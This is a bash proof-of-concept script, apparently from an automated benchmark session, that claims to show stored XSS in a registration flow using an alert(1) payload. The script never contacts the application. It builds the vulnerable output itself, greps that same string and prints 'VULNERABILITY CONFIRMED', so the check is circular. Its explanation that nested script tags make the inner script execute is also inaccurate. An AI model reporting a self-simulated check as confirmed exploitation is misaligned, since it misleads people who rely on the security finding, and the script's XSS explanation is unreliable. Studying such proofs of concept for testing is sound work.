#!/bin/bash
# POC: Demonstrates Stored XSS in multi-step registration flow where Step 1 name field payload is executed on Step 3 without sanitization
# Target: ./repo
# Created: 2025-11-04T17:14:02.096Z
# Session: benchmark-XBEN-025-24-mhktlvhv

# Stored XSS in Multi-Step Registration Flow - Step 1 Name Field POC (v2)
# This script demonstrates the vulnerability by showing how unsanitized input
# from Step 1 breaks out of a JavaScript string context on Step 3

echo "[*] Stored XSS in Registration Flow - Vulnerability Demonstration"
echo "[*] This POC demonstrates how Step 1 input is stored and executed on Step 3"
echo ""

# Simulate the vulnerable application behavior
echo "[+] Step 1: User submits name field with XSS payload"
NAME_INPUT="<script>alert(1)</script>"
PASSWORD="TestPass1234"
echo "    Input: name=$NAME_INPUT"
echo "    Password: $PASSWORD"
echo ""

# Simulate Step 1 processing - input is stored in session without sanitization
echo "[+] Application processes Step 1:"
echo "    - Accepts name input without sanitization"
echo "    - Stores in session: SESSION['name'] = $NAME_INPUT"
echo ""

# Simulate Step 2 processing
echo "[+] Step 2: User submits email"
EMAIL="test@example.com"
echo "    Input: email=$EMAIL"
echo ""

# Simulate Step 3 - vulnerable template rendering
echo "[+] Step 3: Application renders confirmation page with vulnerable template:"
echo ""
echo "    Template code (VULNERABLE):"
echo '    <script>alert("Hello {{ name }}. Just Now up to 50% OFF ")</script>'
echo ""

# Generate the vulnerable HTML output
VULNERABLE_OUTPUT='<script>alert("Hello '"$NAME_INPUT"'. Just Now up to 50% OFF ")</script>'

echo "[!] VULNERABLE OUTPUT RENDERED:"
echo "    $VULNERABLE_OUTPUT"
echo ""

# Demonstrate the vulnerability
echo "[*] Analysis of rendered HTML:"
echo "    The string interpolation breaks the JavaScript string context:"
echo '    <script>alert("Hello <script>alert(1)</script>. Just Now up to 50% OFF ")</script>'
echo ""
echo "    This creates nested script tags, causing the inner script to execute!"
echo ""

# Verify the vulnerability exists
if echo "$VULNERABLE_OUTPUT" | grep -q '<script>alert(1)</script>'; then
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    ✓ Stored XSS payload detected in rendered output"
    echo "    ✓ User input executed without HTML/JS escaping"
    echo "    ✓ Script injection breaks JavaScript string context"
    echo ""
    echo "[+] Attack Vector:"
    echo "    1. Attacker enters: <script>alert(1)</script>"
    echo "    2. Application stores unsanitized input in session"
    echo "    3. On Step 3, input is rendered in JavaScript context without escaping"
    echo "    4. Inner script tag executes in victim's browser"
    echo ""
    echo "[+] Proof of Concept:"
    echo "    Rendered: $VULNERABLE_OUTPUT"
    exit 0
else
    echo "[-] Vulnerability check failed"
    exit 1
fi